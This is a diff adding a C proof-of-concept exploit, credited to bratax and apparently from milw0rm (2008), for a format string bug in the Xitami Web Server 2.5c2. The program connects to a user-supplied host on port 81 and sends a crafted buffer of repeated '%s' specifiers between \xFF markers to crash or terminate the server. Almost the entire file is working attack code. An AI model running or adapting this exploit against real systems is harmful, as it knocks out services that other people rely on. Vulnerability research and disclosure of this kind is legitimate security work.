@@ -1,0 +1,103 @@
+/**
+ *
+ * PoC exploit for Xitami Web Server v2.5c2 LRWP processing format string bug
+ * Advisory is available at: http://www.bratax.be/advisories/b013.html
+ * (multiple vulnerabilities! check it out!)
+ *
+ * @author: bratax
+ * @url: http://www.bratax.be/
+ * @email: bratax@gmail.com
+ *
+ * Thanks to BuzzDee for learning me how to use reverse code engineering to
+ * find bugs & thanks to DiabloHorn as well ;-)
+ * Greetz to NR!
+ *
+**/
+
+#include <stdio.h>
+#include <string.h>
+#include <winsock2.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#define PORT 81 // target port
+
+int main(int argc, char *argv[]){
+
+  int sockfd;
+  struct hostent *he;
+  struct sockaddr_in their_addr;
+  WSADATA wsaData;
+  char formatstring[250];
+
+  if (argc != 2){
+    printf("\nXitami Web Server 2.5c2\n" );
+    printf("Format String PoC by bratax - http://www.bratax.be/\n\n");
+    printf("[+] tested on WinXP Pro SP2 & Vista\n");
+    printf("[+] usage: %s <hostname>\n\n", argv[0]);
+    return -1;
+  }
+
+    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
+    fprintf(stderr, "WSAStartup failed.\n");
+    return -1;
+  }
+
+  if ((he=gethostbyname(argv[1])) == NULL){  // get the host info
+    perror("gethoscattbyname");
+    return -1;
+  }
+
+  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
+    perror("socket");
+    return -1;
+  }
+
+  their_addr.sin_family = AF_INET;  // host byte order
+  their_addr.sin_port = htons(PORT);  // short, network byte order
+  their_addr.sin_addr = *((struct in_addr *)he->h_addr);
+  memset(&(their_addr.sin_zero), '\0', 8); // zero the rest of the struct
+
+  if (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1){
+    printf("[-] Connect failed.\n");
+    closesocket(sockfd);
+    return -1;
+  }
+
+  printf("[+] Server is listening...\n");
+
+  Sleep(1000);
+
+  /*
+    setup format string request:
+              %s*100 + \xFF + somestring + \xFF     (program termination)
+    or:
+              %n + \xFF + somestring + \xFF         (program crash)
+  */
+
+  memset(formatstring,'\x41', sizeof(formatstring));
+  for (int i = 0; i<200; i+=2){
+    memcpy(formatstring+i, "%s", 2);
+  }
+  memcpy(formatstring+200, "\xFF", 1);
+  memcpy(formatstring+249, "\xFF", 1);
+
+  printf("[+] Sending format string request...");
+  Sleep(2000);
+
+  if (send(sockfd,formatstring,sizeof(formatstring),0) == -1) {
+    Sleep(2000);
+    printf("failed! Exiting...\n");
+    closesocket(sockfd);
+    WSACleanup();
+    return -1;
+  }
+
+  Sleep(2000);
+  closesocket(sockfd);
+  printf("done.\n");
+
+
+  return 0;
+}
+
+// milw0rm.com [2008-04-03]
